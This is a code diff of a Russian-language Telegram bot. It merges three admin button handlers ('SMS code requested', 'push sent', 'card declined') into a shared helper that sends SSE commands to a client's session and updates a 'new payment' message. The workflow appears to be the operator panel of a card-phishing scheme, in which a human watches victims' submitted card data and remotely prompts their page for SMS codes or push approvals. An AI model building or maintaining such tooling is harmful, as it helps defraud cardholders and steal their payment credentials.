@@ -392,6 +392,21 @@ async def send_sse_command(user_id, action_type, payment_id=None):
         logger.error(f"💥 Ошибка HTTP запроса: {e}")
         return False
 
+# ========== ОБЩАЯ ФУНКЦИЯ ДЛЯ СТАТУСОВ ПЛАТЕЖЕЙ ==========
+async def update_payment_status(callback, payment_id, user_id, status_text, action_type):
+    """Общая функция для обновления статуса платежа"""
+    success = await send_sse_command(user_id, action_type, payment_id)
+    
+    await callback.message.edit_text(
+        f"💳 <b>НОВАЯ ОПЛАТА #{payment_id}</b>\n\n"
+        f"👤 Клиент: {user_id}\n"
+        f"{status_text}\n\n"
+        f"Выберите действие:",
+        reply_markup=get_payment_buttons(payment_id, user_id),
+        parse_mode="HTML"
+    )
+    return success
+
 # Обработчик для платежных данных
 @dp.message(F.chat.id == ADMIN_CHAT_ID)
 async def handle_admin_messages(message: types.Message):
@@ -447,19 +462,17 @@ async def process_payment_data(message: types.Message):
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
 
-# Обработчики инлайн кнопок для платежей
+# Обработчики инлайн кнопок для платежей (УПРОЩЕННЫЕ)
 @dp.callback_query(F.data.startswith("sms_"))
 async def sms_code_handler(callback: types.CallbackQuery):
     parts = callback.data.split("_")
     payment_id = parts[1]
     user_id = parts[2]
     
-    success = await send_sse_command(user_id, "sms", payment_id)
-    
-    await callback.message.edit_text(
-        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n" +
-        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки"),
-        parse_mode="HTML"
+    await update_payment_status(
+        callback, payment_id, user_id, 
+        "📱 <b>Статус: SMS код запрошен</b>", 
+        "sms"
     )
     await callback.answer("SMS код запрошен")
 
@@ -469,12 +482,10 @@ async def push_handler(callback: types.CallbackQuery):
     payment_id = parts[1]
     user_id = parts[2]
     
-    success = await send_sse_command(user_id, "push", payment_id)
-    
-    await callback.message.edit_text(
-        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n" +
-        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки"),
-        parse_mode="HTML"
+    await update_payment_status(
+        callback, payment_id, user_id,
+        "🔔 <b>Статус: Пуш отправлен</b>", 
+        "push"
     )
     await callback.answer("Пуш отправлен")
 
@@ -484,12 +495,10 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     payment_id = parts[1]
     user_id = parts[2]
     
-    success = await send_sse_command(user_id, "wrong_card", payment_id)
-    
-    await callback.message.edit_text(
-        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n" +
-        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки"),
-        parse_mode="HTML"
+    await update_payment_status(
+        callback, payment_id, user_id,
+        "❌ <b>Статус: Карта отклонена</b>", 
+        "wrong_card"
     )
     await callback.answer("Карта отклонена")
 
@@ -859,5 +868,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
